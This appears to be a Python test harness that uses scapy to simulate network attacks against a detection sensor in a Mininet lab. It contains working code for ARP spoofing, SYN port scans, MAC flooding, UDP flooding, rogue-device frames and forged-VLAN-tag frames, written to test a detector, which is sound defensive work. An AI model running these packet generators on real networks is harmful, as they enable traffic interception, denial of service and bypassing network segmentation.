#!/usr/bin/env python3
"""
Attack simulator for the WARDEN sensor. Run it FROM a Mininet host so the
traffic really crosses the switches. Inside the mininet> CLI use absolute paths:

  mininet> h3 /home/<you>/ryu-venv/bin/python3 /home/<you>/<repo>/detection/simulate_attacks.py \
             arp-spoof --iface h3-eth0 --victim-ip 10.0.0.1

Subcommands and the detector each one should trigger:
  arp-spoof      claim another host's IP                       -> arp-spoof
  port-scan      TCP SYNs to many ports of one target          -> port-scan
  mac-flood      frames from many random source MACs           -> mac-flood
  traffic-flood  a burst of UDP frames from one MAC            -> traffic-rate
  rogue-device   frames from a MAC that is not in the policy   -> unauthorized-device
  vlan-hop       frame carrying a forged 802.1Q tag            -> vlan-violation
"""

import argparse
import random

from scapy.all import ARP, IP, TCP, UDP, Dot1Q, Ether, Raw, get_if_hwaddr, sendp

BROADCAST = "ff:ff:ff:ff:ff:ff"


def mac_for_ip(ip):
    """Topology convention: 10.0.0.N has MAC 00:00:00:00:00:0N."""
    return "00:00:00:00:00:%02x" % int(ip.split(".")[-1])


def random_mac():
    # 02:... = locally administered unicast, never in the policy table
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))


def send(frames, iface, inter=0.0):
    sendp(frames, iface=iface, inter=inter, verbose=False)


def arp_spoof(a):
    me = get_if_hwaddr(a.iface)
    pkt = Ether(src=me, dst=BROADCAST) / ARP(
        op=2, psrc=a.victim_ip, hwsrc=me, pdst=a.victim_ip, hwdst=BROADCAST)
    print(f"[*] {a.count} forged ARP replies: {a.victim_ip} is-at {me}")
    send([pkt] * a.count, a.iface, inter=0.3)


def port_scan(a):
    me = get_if_hwaddr(a.iface)
    dst_mac = a.target_mac or mac_for_ip(a.target_ip)
    frames = [Ether(src=me, dst=dst_mac) / IP(dst=a.target_ip) / TCP(dport=p, flags="S")
              for p in range(a.first_port, a.last_port + 1)]
    print(f"[*] scanning {a.target_ip} ports {a.first_port}-{a.last_port}")
    send(frames, a.iface, inter=0.02)


def mac_flood(a):
    frames = [Ether(src=random_mac(), dst=BROADCAST) / ARP(op=1, pdst="10.0.0.1")
              for _ in range(a.count)]
    print(f"[*] {a.count} frames from {a.count} distinct random source MACs")
    send(frames, a.iface, inter=0.02)


def traffic_flood(a):
    me = get_if_hwaddr(a.iface)
    dst_mac = a.target_mac or mac_for_ip(a.target_ip)
    frame = Ether(src=me, dst=dst_mac) / IP(dst=a.target_ip) / UDP(dport=9) / Raw(b"x" * 32)
    print(f"[*] {a.count} UDP frames to {a.target_ip}")
    send([frame] * a.count, a.iface, inter=0.005)


def rogue_device(a):
    mac = random_mac()
    pkt = Ether(src=mac, dst=BROADCAST) / ARP(op=1, psrc="10.0.0.77", pdst="10.0.0.1")
    print(f"[*] {a.count} frames from unregistered MAC {mac}")
    send([pkt] * a.count, a.iface, inter=0.2)


def vlan_hop(a):
    me = get_if_hwaddr(a.iface)
    pkt = Ether(src=me, dst=BROADCAST) / Dot1Q(vlan=a.forged_vlan) / ARP(
        op=1, psrc=a.src_ip, pdst="10.0.0.2")
    print(f"[*] {a.count} frames from {me} forged with 802.1Q VLAN {a.forged_vlan}")
    send([pkt] * a.count, a.iface, inter=0.3)


def main():
    p = argparse.ArgumentParser(description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = p.add_subparsers(dest="attack", required=True)

    def add(name, fn, **kw):
        sp = sub.add_parser(name)
        sp.add_argument("--iface", required=True, help="host interface, e.g. h3-eth0")
        sp.set_defaults(fn=fn)
        return sp

    sp = add("arp-spoof", arp_spoof)
    sp.add_argument("--victim-ip", required=True)
    sp.add_argument("--count", type=int, default=3)

    sp = add("port-scan", port_scan)
    sp.add_argument("--target-ip", required=True)
    sp.add_argument("--target-mac")
    sp.add_argument("--first-port", type=int, default=1)
    sp.add_argument("--last-port", type=int, default=40)

    sp = add("mac-flood", mac_flood)
    sp.add_argument("--count", type=int, default=40)

    sp = add("traffic-flood", traffic_flood)
    sp.add_argument("--target-ip", required=True)
    sp.add_argument("--target-mac")
    sp.add_argument("--count", type=int, default=300)

    sp = add("rogue-device", rogue_device)
    sp.add_argument("--count", type=int, default=3)

    sp = add("vlan-hop", vlan_hop)
    sp.add_argument("--forged-vlan", type=int, default=20)
    sp.add_argument("--src-ip", default="10.0.0.1")
    sp.add_argument("--count", type=int, default=3)

    args = p.parse_args()
    args.fn(args)
    print("[*] done")


if __name__ == "__main__":
    main()
